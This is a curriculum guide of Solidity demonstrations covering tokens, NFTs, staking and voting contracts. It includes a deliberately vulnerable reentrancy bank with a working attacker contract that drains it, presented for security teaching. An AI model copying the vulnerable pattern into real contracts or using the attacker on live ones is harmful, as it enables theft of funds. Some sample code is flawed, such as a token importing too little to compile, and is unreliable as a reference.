# VISE Curriculum Demonstrations Guide

**Version:** 1.0.0
**Last Updated:** 2025-11-22
**Purpose:** Comprehensive guide for creating hands-on demonstrations for all curriculum modules

## Overview

This guide provides detailed instructions for creating practical demonstrations that students will complete as part of the VISE curriculum. Each demonstration is designed to be:

- **Hands-on**: Students write and deploy real code
- **Progressive**: Each demo builds on previous knowledge
- **Practical**: Real-world applications and patterns
- **Testable**: Automated tests verify correctness
- **Deployable**: Students deploy to testnets

## Demonstration Philosophy

### Learning by Doing

Every module includes multiple demonstrations:

1. **Guided Walkthroughs**: Step-by-step tutorials
2. **Practice Exercises**: Repetition with variations
3. **Challenge Projects**: Open-ended problems to solve
4. **Integration Labs**: Combining multiple concepts

### Tools & Environment

**Required Setup:**
```bash
# Node.js and package manager
node >= 18.0.0
npm >= 9.0.0

# Development frameworks
Foundry (forge, cast, anvil)
Hardhat
Remix IDE (browser-based)

# Wallets
MetaMask browser extension
Test wallet with testnet ETH

# Optional but recommended
VS Code with Solidity extensions
Git for version control
```

## Module 2: Solidity & Smart Contracts

### Demo 2.1: Hello World Contract (Day 2)

**Objective:** Deploy first smart contract to testnet

**Setup:**

```bash
mkdir vise-demo-hello-world
cd vise-demo-hello-world
npm init -y
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox
npx hardhat init
```

**Contract: contracts/HelloWorld.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract HelloWorld {
    string public message;
    address public owner;
    uint256 public updateCount;

    event MessageUpdated(string oldMessage, string newMessage, address updater);

    constructor(string memory initialMessage) {
        message = initialMessage;
        owner = msg.sender;
        updateCount = 0;
    }

    function updateMessage(string memory newMessage) public {
        string memory oldMessage = message;
        message = newMessage;
        updateCount++;

        emit MessageUpdated(oldMessage, newMessage, msg.sender);
    }

    function getMessage() public view returns (string memory) {
        return message;
    }

    function getOwner() public view returns (address) {
        return owner;
    }
}
```

**Test: test/HelloWorld.test.js**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("HelloWorld", function () {
  let helloWorld;
  let owner;
  let addr1;

  beforeEach(async function () {
    [owner, addr1] = await ethers.getSigners();
    const HelloWorld = await ethers.getContractFactory("HelloWorld");
    helloWorld = await HelloWorld.deploy("Hello, VISE!");
    await helloWorld.waitForDeployment();
  });

  it("Should set the initial message", async function () {
    expect(await helloWorld.message()).to.equal("Hello, VISE!");
  });

  it("Should set the correct owner", async function () {
    expect(await helloWorld.owner()).to.equal(owner.address);
  });

  it("Should update the message", async function () {
    await helloWorld.updateMessage("Updated message");
    expect(await helloWorld.message()).to.equal("Updated message");
  });

  it("Should increment update count", async function () {
    await helloWorld.updateMessage("First update");
    await helloWorld.updateMessage("Second update");
    expect(await helloWorld.updateCount()).to.equal(2);
  });

  it("Should emit MessageUpdated event", async function () {
    await expect(helloWorld.updateMessage("New message"))
      .to.emit(helloWorld, "MessageUpdated")
      .withArgs("Hello, VISE!", "New message", owner.address);
  });
});
```

**Deployment Script: scripts/deploy.js**

```javascript
const hre = require("hardhat");

async function main() {
  const initialMessage = "Hello from VISE Education Platform!";

  console.log("Deploying HelloWorld contract...");

  const HelloWorld = await hre.ethers.getContractFactory("HelloWorld");
  const helloWorld = await HelloWorld.deploy(initialMessage);

  await helloWorld.waitForDeployment();

  const address = await helloWorld.getAddress();
  console.log(`HelloWorld deployed to: ${address}`);
  console.log(`Initial message: ${await helloWorld.message()}`);

  // Verify on Etherscan
  if (hre.network.name !== "localhost" && hre.network.name !== "hardhat") {
    console.log("Waiting for block confirmations...");
    await helloWorld.deploymentTransaction().wait(6);

    console.log("Verifying contract...");
    await hre.run("verify:verify", {
      address: address,
      constructorArguments: [initialMessage],
    });
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```

**hardhat.config.js:**

```javascript
require("@nomicfoundation/hardhat-toolbox");
require("dotenv").config();

module.exports = {
  solidity: "0.8.20",
  networks: {
    sepolia: {
      url: process.env.SEPOLIA_RPC_URL || "",
      accounts: process.env.PRIVATE_KEY ? [process.env.PRIVATE_KEY] : [],
    },
  },
  etherscan: {
    apiKey: process.env.ETHERSCAN_API_KEY || "",
  },
};
```

**Student Tasks:**
1. Write and compile the contract
2. Run tests locally (`npx hardhat test`)
3. Deploy to local network (`npx hardhat node`)
4. Deploy to Sepolia testnet
5. Verify contract on Etherscan
6. Interact with deployed contract using Etherscan UI

---

### Demo 2.2: Voting Contract with Access Control (Day 3)

**Objective:** Implement access control patterns and mappings

**Contract: contracts/SimpleVoting.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";

contract SimpleVoting is Ownable {
    struct Proposal {
        string description;
        uint256 voteCount;
        uint256 deadline;
        bool executed;
    }

    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bool)) public hasVoted;
    uint256 public proposalCount;

    event ProposalCreated(uint256 indexed proposalId, string description, uint256 deadline);
    event VoteCast(uint256 indexed proposalId, address indexed voter);
    event ProposalExecuted(uint256 indexed proposalId);

    constructor() Ownable(msg.sender) {}

    function createProposal(string memory description, uint256 durationInDays) public onlyOwner {
        uint256 proposalId = proposalCount++;
        proposals[proposalId] = Proposal({
            description: description,
            voteCount: 0,
            deadline: block.timestamp + (durationInDays * 1 days),
            executed: false
        });

        emit ProposalCreated(proposalId, description, proposals[proposalId].deadline);
    }

    function vote(uint256 proposalId) public {
        require(proposalId < proposalCount, "Proposal does not exist");
        require(block.timestamp < proposals[proposalId].deadline, "Voting has ended");
        require(!hasVoted[proposalId][msg.sender], "Already voted");
        require(!proposals[proposalId].executed, "Proposal already executed");

        hasVoted[proposalId][msg.sender] = true;
        proposals[proposalId].voteCount++;

        emit VoteCast(proposalId, msg.sender);
    }

    function executeProposal(uint256 proposalId) public onlyOwner {
        require(proposalId < proposalCount, "Proposal does not exist");
        require(block.timestamp >= proposals[proposalId].deadline, "Voting still ongoing");
        require(!proposals[proposalId].executed, "Already executed");

        proposals[proposalId].executed = true;
        emit ProposalExecuted(proposalId);
    }

    function getProposal(uint256 proposalId) public view returns (
        string memory description,
        uint256 voteCount,
        uint256 deadline,
        bool executed
    ) {
        Proposal memory proposal = proposals[proposalId];
        return (proposal.description, proposal.voteCount, proposal.deadline, proposal.executed);
    }
}
```

**Student Tasks:**
1. Implement the voting contract
2. Write comprehensive tests (80%+ coverage)
3. Add emergency stop functionality
4. Deploy and verify on testnet
5. Create multiple proposals and vote on them

---

### Demo 2.3: Simple Staking Contract (Day 4)

**Objective:** Learn time-based logic and reward calculations

**Contract: contracts/SimpleStaking.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SimpleStaking {
    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public stakingTimestamp;

    uint256 public constant REWARD_RATE = 10; // 10% APY
    uint256 public constant SECONDS_PER_YEAR = 365 days;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount, uint256 reward);

    function stake() public payable {
        require(msg.value > 0, "Cannot stake 0");

        // Claim existing rewards before adding new stake
        if (stakedAmount[msg.sender] > 0) {
            uint256 reward = calculateReward(msg.sender);
            if (reward > 0) {
                payable(msg.sender).transfer(reward);
            }
        }

        stakedAmount[msg.sender] += msg.value;
        stakingTimestamp[msg.sender] = block.timestamp;

        emit Staked(msg.sender, msg.value);
    }

    function unstake() public {
        require(stakedAmount[msg.sender] > 0, "No stake to withdraw");

        uint256 amount = stakedAmount[msg.sender];
        uint256 reward = calculateReward(msg.sender);
        uint256 total = amount + reward;

        stakedAmount[msg.sender] = 0;
        stakingTimestamp[msg.sender] = 0;

        payable(msg.sender).transfer(total);

        emit Unstaked(msg.sender, amount, reward);
    }

    function calculateReward(address user) public view returns (uint256) {
        if (stakedAmount[user] == 0) return 0;

        uint256 stakingDuration = block.timestamp - stakingTimestamp[user];
        uint256 reward = (stakedAmount[user] * REWARD_RATE * stakingDuration)
                        / (100 * SECONDS_PER_YEAR);

        return reward;
    }

    function getStakeInfo(address user) public view returns (
        uint256 amount,
        uint256 timestamp,
        uint256 reward
    ) {
        return (
            stakedAmount[user],
            stakingTimestamp[user],
            calculateReward(user)
        );
    }

    receive() external payable {}
}
```

---

## Module 3: NFT Engineering

### Demo 3.1: Basic ERC-721 NFT (Day 2)

**Objective:** Create and deploy a simple NFT collection

**Contract: contracts/VISEAchievementNFT.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract VISEAchievementNFT is ERC721, ERC721URIStorage, Ownable {
    uint256 private _tokenIdCounter;

    mapping(uint256 => uint256) public tokenToModule; // Token ID -> Module ID
    mapping(address => mapping(uint256 => bool)) public hasModuleToken; // User -> Module -> Has Token

    event AchievementMinted(address indexed to, uint256 indexed tokenId, uint256 indexed moduleId);

    constructor() ERC721("VISE Achievement", "VISE-ACH") Ownable(msg.sender) {}

    function mintAchievement(
        address to,
        uint256 moduleId,
        string memory metadataURI
    ) public onlyOwner returns (uint256) {
        require(!hasModuleToken[to][moduleId], "Already has this module achievement");

        uint256 tokenId = _tokenIdCounter++;
        _safeMint(to, tokenId);
        _setTokenURI(tokenId, metadataURI);

        tokenToModule[tokenId] = moduleId;
        hasModuleToken[to][moduleId] = true;

        emit AchievementMinted(to, tokenId, moduleId);

        return tokenId;
    }

    function hasAchievement(address user, uint256 moduleId) public view returns (bool) {
        return hasModuleToken[user][moduleId];
    }

    function getUserAchievements(address user) public view returns (uint256[] memory) {
        uint256 balance = balanceOf(user);
        uint256[] memory achievements = new uint256[](balance);
        uint256 currentIndex = 0;

        for (uint256 i = 0; i < _tokenIdCounter; i++) {
            if (_ownerOf(i) == user) {
                achievements[currentIndex] = tokenToModule[i];
                currentIndex++;
            }
        }

        return achievements;
    }

    // Override required functions
    function tokenURI(uint256 tokenId)
        public
        view
        override(ERC721, ERC721URIStorage)
        returns (string memory)
    {
        return super.tokenURI(tokenId);
    }

    function supportsInterface(bytes4 interfaceId)
        public
        view
        override(ERC721, ERC721URIStorage)
        returns (bool)
    {
        return super.supportsInterface(interfaceId);
    }
}
```

**Metadata Example: metadata/module-1.json**

```json
{
  "name": "VISE Module 1: Prompt Engineering",
  "description": "Proof of completion for VISE Module 1 - Prompt Engineering Fundamentals",
  "image": "ipfs://QmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/module-1.png",
  "attributes": [
    {
      "trait_type": "Module",
      "value": "Prompt Engineering"
    },
    {
      "trait_type": "Level",
      "value": 1
    },
    {
      "trait_type": "Category",
      "value": "AI Fundamentals"
    },
    {
      "trait_type": "Completion Date",
      "value": "2024-11-22"
    }
  ]
}
```

**Student Tasks:**
1. Deploy NFT contract to testnet
2. Upload metadata to IPFS (use Pinata or NFT.Storage)
3. Mint test NFTs
4. View NFTs on OpenSea testnet
5. Implement transfer restrictions (make soulbound)

---

### Demo 3.2: Dynamic NFT with On-Chain SVG (Day 5)

**Objective:** Create NFT with on-chain metadata that changes

**Contract: contracts/DynamicProgressNFT.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";

contract DynamicProgressNFT is ERC721 {
    using Strings for uint256;

    struct Progress {
        uint256 modulesCompleted;
        uint256 totalScore;
        uint256 lastUpdate;
    }

    mapping(uint256 => Progress) public tokenProgress;
    uint256 private _tokenIdCounter;

    constructor() ERC721("VISE Progress Badge", "VISE-PROG") {}

    function mint() public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _safeMint(msg.sender, tokenId);

        tokenProgress[tokenId] = Progress({
            modulesCompleted: 0,
            totalScore: 0,
            lastUpdate: block.timestamp
        });

        return tokenId;
    }

    function updateProgress(uint256 tokenId, uint256 scoreToAdd) public {
        require(ownerOf(tokenId) == msg.sender, "Not token owner");

        tokenProgress[tokenId].modulesCompleted++;
        tokenProgress[tokenId].totalScore += scoreToAdd;
        tokenProgress[tokenId].lastUpdate = block.timestamp;
    }

    function generateSVG(uint256 tokenId) public view returns (string memory) {
        Progress memory progress = tokenProgress[tokenId];

        string memory svg = string(abi.encodePacked(
            '<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">',
            '<rect width="500" height="500" fill="#1a1a1a"/>',
            '<text x="250" y="100" font-family="Arial" font-size="32" fill="#fff" text-anchor="middle">',
            'VISE Progress Badge',
            '</text>',
            '<text x="250" y="200" font-family="Arial" font-size="24" fill="#3eaf7c" text-anchor="middle">',
            'Modules: ', progress.modulesCompleted.toString(),
            '</text>',
            '<text x="250" y="250" font-family="Arial" font-size="24" fill="#3eaf7c" text-anchor="middle">',
            'Score: ', progress.totalScore.toString(),
            '</text>',
            '<circle cx="250" cy="350" r="', (progress.modulesCompleted * 10).toString(), '" fill="#3eaf7c" opacity="0.5"/>',
            '</svg>'
        ));

        return svg;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        require(_ownerOf(tokenId) != address(0), "Token does not exist");

        string memory svg = generateSVG(tokenId);
        Progress memory progress = tokenProgress[tokenId];

        string memory json = Base64.encode(bytes(string(abi.encodePacked(
            '{"name": "VISE Progress Badge #', tokenId.toString(), '",',
            '"description": "Dynamic NFT showing VISE learning progress",',
            '"image": "data:image/svg+xml;base64,', Base64.encode(bytes(svg)), '",',
            '"attributes": [',
                '{"trait_type": "Modules Completed", "value": ', progress.modulesCompleted.toString(), '},',
                '{"trait_type": "Total Score", "value": ', progress.totalScore.toString(), '},',
                '{"trait_type": "Last Update", "value": ', progress.lastUpdate.toString(), '}',
            ']}'
        ))));

        return string(abi.encodePacked('data:application/json;base64,', json));
    }
}
```

---

## Module 4: Tokenomics & Governance

### Demo 4.1: ERC-20 Governance Token (Day 2)

**Contract: contracts/VISEToken.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract VISEToken is ERC20, ERC20Burnable, ERC20Votes, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    uint256 public constant MAX_SUPPLY = 1_000_000_000 * 10**18; // 1 billion tokens

    constructor() ERC20("VISE Governance Token", "VISE") ERC20Permit("VISE Governance Token") {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);

        // Initial mint to treasury
        _mint(msg.sender, 100_000_000 * 10**18); // 100 million tokens
    }

    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
        require(totalSupply() + amount <= MAX_SUPPLY, "Exceeds max supply");
        _mint(to, amount);
    }

    // Required overrides
    function _update(address from, address to, uint256 value)
        internal
        override(ERC20, ERC20Votes)
    {
        super._update(from, to, value);
    }

    function nonces(address owner)
        public
        view
        override(ERC20Permit, Nonces)
        returns (uint256)
    {
        return super.nonces(owner);
    }
}
```

---

### Demo 4.2: Staking with Rewards (Day 4)

**Contract: contracts/TokenStaking.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TokenStaking is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    IERC20 public stakingToken;
    IERC20 public rewardToken;

    uint256 public rewardRate = 100; // 100 tokens per day per 1000 staked
    uint256 public constant REWARD_PRECISION = 1e18;

    struct StakeInfo {
        uint256 amount;
        uint256 rewardDebt;
        uint256 stakingTime;
    }

    mapping(address => StakeInfo) public stakes;
    uint256 public totalStaked;
    uint256 public accRewardPerShare;
    uint256 public lastRewardTime;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 reward);

    constructor(address _stakingToken, address _rewardToken) Ownable(msg.sender) {
        stakingToken = IERC20(_stakingToken);
        rewardToken = IERC20(_rewardToken);
        lastRewardTime = block.timestamp;
    }

    function updatePool() public {
        if (block.timestamp <= lastRewardTime) {
            return;
        }

        if (totalStaked == 0) {
            lastRewardTime = block.timestamp;
            return;
        }

        uint256 timeElapsed = block.timestamp - lastRewardTime;
        uint256 reward = (timeElapsed * rewardRate * REWARD_PRECISION) / 86400; // per day

        accRewardPerShare += reward / totalStaked;
        lastRewardTime = block.timestamp;
    }

    function stake(uint256 amount) external nonReentrant {
        require(amount > 0, "Cannot stake 0");

        updatePool();

        StakeInfo storage userStake = stakes[msg.sender];

        if (userStake.amount > 0) {
            uint256 pending = (userStake.amount * accRewardPerShare) / REWARD_PRECISION - userStake.rewardDebt;
            if (pending > 0) {
                rewardToken.safeTransfer(msg.sender, pending);
                emit RewardClaimed(msg.sender, pending);
            }
        }

        stakingToken.safeTransferFrom(msg.sender, address(this), amount);

        userStake.amount += amount;
        userStake.stakingTime = block.timestamp;
        totalStaked += amount;

        userStake.rewardDebt = (userStake.amount * accRewardPerShare) / REWARD_PRECISION;

        emit Staked(msg.sender, amount);
    }

    function unstake(uint256 amount) external nonReentrant {
        StakeInfo storage userStake = stakes[msg.sender];
        require(userStake.amount >= amount, "Insufficient stake");

        updatePool();

        uint256 pending = (userStake.amount * accRewardPerShare) / REWARD_PRECISION - userStake.rewardDebt;

        userStake.amount -= amount;
        totalStaked -= amount;

        userStake.rewardDebt = (userStake.amount * accRewardPerShare) / REWARD_PRECISION;

        if (pending > 0) {
            rewardToken.safeTransfer(msg.sender, pending);
            emit RewardClaimed(msg.sender, pending);
        }

        stakingToken.safeTransfer(msg.sender, amount);

        emit Unstaked(msg.sender, amount);
    }

    function pendingReward(address user) external view returns (uint256) {
        StakeInfo memory userStake = stakes[user];
        uint256 _accRewardPerShare = accRewardPerShare;

        if (block.timestamp > lastRewardTime && totalStaked > 0) {
            uint256 timeElapsed = block.timestamp - lastRewardTime;
            uint256 reward = (timeElapsed * rewardRate * REWARD_PRECISION) / 86400;
            _accRewardPerShare += reward / totalStaked;
        }

        return (userStake.amount * _accRewardPerShare) / REWARD_PRECISION - userStake.rewardDebt;
    }

    function setRewardRate(uint256 _rewardRate) external onlyOwner {
        updatePool();
        rewardRate = _rewardRate;
    }
}
```

**Student Tasks:**
1. Deploy staking token and reward token
2. Deploy staking contract
3. Test staking, unstaking, and reward claiming
4. Calculate APY based on reward rate
5. Add lock-up period feature
6. Deploy to testnet and stake tokens

---

## Module 5: Privacy & Security

### Demo 5.1: Vulnerable Contract + Fixed Version (Day 1-2)

**Vulnerable Contract: contracts/VulnerableBank.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// WARNING: This contract has intentional vulnerabilities for educational purposes
// DO NOT use in production!

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABILITY: Reentrancy attack possible!
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;  // State update AFTER external call!
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}
```

**Exploit Contract: contracts/BankAttacker.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract BankAttacker {
    IVulnerableBank public bank;
    uint256 public attackAmount = 1 ether;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH");
        bank.deposit{value: attackAmount}();
        bank.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }

    function getStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

**Secure Contract: contracts/SecureBank.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() public payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // FIX: Using Checks-Effects-Interactions pattern + ReentrancyGuard
    function withdraw(uint256 amount) public nonReentrant {
        // Checks
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(amount > 0, "Amount must be > 0");

        // Effects
        balances[msg.sender] -= amount;

        // Interactions
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, amount);
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}
```

**Student Tasks:**
1. Deploy vulnerable bank and attacker contracts
2. Execute reentrancy attack on local network
3. Understand why the attack works
4. Deploy secure version
5. Attempt attack on secure version (should fail)
6. Write tests demonstrating both scenarios

---

### Demo 5.2: Commit-Reveal Voting (Day 4)

**Contract: contracts/CommitRevealVoting.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CommitRevealVoting {
    struct Proposal {
        string description;
        uint256 yesVotes;
        uint256 noVotes;
        uint256 commitDeadline;
        uint256 revealDeadline;
        bool finalized;
    }

    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bytes32)) public commitments;
    mapping(uint256 => mapping(address => bool)) public hasRevealed;
    uint256 public proposalCount;

    event ProposalCreated(uint256 indexed proposalId, string description);
    event VoteCommitted(uint256 indexed proposalId, address indexed voter);
    event VoteRevealed(uint256 indexed proposalId, address indexed voter, bool vote);

    function createProposal(string memory description, uint256 commitDuration, uint256 revealDuration) public {
        uint256 proposalId = proposalCount++;
        proposals[proposalId] = Proposal({
            description: description,
            yesVotes: 0,
            noVotes: 0,
            commitDeadline: block.timestamp + commitDuration,
            revealDeadline: block.timestamp + commitDuration + revealDuration,
            finalized: false
        });

        emit ProposalCreated(proposalId, description);
    }

    function commitVote(uint256 proposalId, bytes32 commitment) public {
        require(block.timestamp < proposals[proposalId].commitDeadline, "Commit phase ended");
        require(commitments[proposalId][msg.sender] == bytes32(0), "Already committed");

        commitments[proposalId][msg.sender] = commitment;
        emit VoteCommitted(proposalId, msg.sender);
    }

    function revealVote(uint256 proposalId, bool vote, bytes32 secret) public {
        Proposal storage proposal = proposals[proposalId];
        require(block.timestamp >= proposal.commitDeadline, "Commit phase not ended");
        require(block.timestamp < proposal.revealDeadline, "Reveal phase ended");
        require(!hasRevealed[proposalId][msg.sender], "Already revealed");

        bytes32 commitment = keccak256(abi.encodePacked(msg.sender, vote, secret));
        require(commitments[proposalId][msg.sender] == commitment, "Invalid reveal");

        hasRevealed[proposalId][msg.sender] = true;

        if (vote) {
            proposal.yesVotes++;
        } else {
            proposal.noVotes++;
        }

        emit VoteRevealed(proposalId, msg.sender, vote);
    }

    function getProposalResult(uint256 proposalId) public view returns (
        string memory description,
        uint256 yesVotes,
        uint256 noVotes,
        bool passed
    ) {
        Proposal memory proposal = proposals[proposalId];
        return (
            proposal.description,
            proposal.yesVotes,
            proposal.noVotes,
            proposal.yesVotes > proposal.noVotes
        );
    }

    // Helper function to generate commitment
    function generateCommitment(bool vote, bytes32 secret) public view returns (bytes32) {
        return keccak256(abi.encodePacked(msg.sender, vote, secret));
    }
}
```

**Student Tasks:**
1. Understand commit-reveal pattern
2. Create test voting scenario
3. Commit votes with secrets
4. Reveal votes after commit deadline
5. Verify vote privacy during commit phase
6. Extend to weighted voting

---

## Setup Script for All Demonstrations

**scripts/setup-demos.sh:**

```bash
#!/bin/bash

echo "Setting up VISE Curriculum Demonstrations..."

# Create main demonstrations directory
mkdir -p demonstrations

# Module 2 demos
mkdir -p demonstrations/module-2-solidity
cd demonstrations/module-2-solidity

echo "Setting up Module 2 demonstrations..."
npm init -y
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox @openzeppelin/contracts dotenv

# Create other module directories
cd ../..
mkdir -p demonstrations/module-3-nfts
mkdir -p demonstrations/module-4-tokenomics
mkdir -p demonstrations/module-5-security

echo "✅ Demo directories created"
echo "📝 Next steps:"
echo "1. Complete .env files with RPC URLs and private keys"
echo "2. Get testnet ETH from faucets"
echo "3. Follow demonstration guides in each module folder"
```

## Testing Framework

**Example test pattern for all demos:**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe("Contract Test Suite", function () {
  let contract;
  let owner, addr1, addr2;

  before(async function () {
    // Get signers
    [owner, addr1, addr2] = await ethers.getSigners();
  });

  beforeEach(async function () {
    // Deploy fresh contract for each test
    const Contract = await ethers.getContractFactory("ContractName");
    contract = await Contract.deploy();
    await contract.waitForDeployment();
  });

  describe("Deployment", function () {
    it("Should set the correct owner", async function () {
      expect(await contract.owner()).to.equal(owner.address);
    });
  });

  describe("Core Functionality", function () {
    it("Should perform expected action", async function () {
      // Test implementation
    });

    it("Should revert on invalid input", async function () {
      await expect(contract.someFunction(0))
        .to.be.revertedWith("Error message");
    });

    it("Should emit correct event", async function () {
      await expect(contract.someFunction())
        .to.emit(contract, "EventName")
        .withArgs(/* expected args */);
    });
  });

  describe("Edge Cases", function () {
    it("Should handle zero values", async function () {
      // Test
    });

    it("Should handle maximum values", async function () {
      // Test
    });
  });

  describe("Access Control", function () {
    it("Should restrict to authorized users", async function () {
      await expect(contract.connect(addr1).restrictedFunction())
        .to.be.revertedWith("Unauthorized");
    });
  });

  describe("Time-based Logic", function () {
    it("Should behave correctly after time passes", async function () {
      await time.increase(86400); // 1 day
      // Test
    });
  });
});
```

## Success Criteria

Each demonstration should have:

✅ Clear learning objective
✅ Complete, tested code
✅ Step-by-step instructions
✅ Deployment guide
✅ Verification steps
✅ Common troubleshooting
✅ Extension challenges

## Additional Resources

- **Foundry Book**: https://book.getfoundry.sh/
- **Hardhat Docs**: https://hardhat.org/docs
- **OpenZeppelin Contracts**: https://docs.openzeppelin.com/contracts
- **Solidity by Example**: https://solidity-by-example.org/
- **Ethernaut**: https://ethernaut.openzeppelin.com/
- **Damn Vulnerable DeFi**: https://www.damnvulnerabledefi.xyz/

---

**Related Documentation:**
- [Module 2 Curriculum](../curriculum/module-2-solidity-smart-contracts.md)
- [Module 3 Curriculum](../curriculum/module-3-nft-engineering.md)
- [Module 4 Curriculum](../curriculum/module-4-tokenomics.md)
- [Module 5 Curriculum](../curriculum/module-5-privacy-security.md)

**Maintained by:** VISE Education Team
**Last Updated:** 2025-11-22
**Version:** 1.0.0
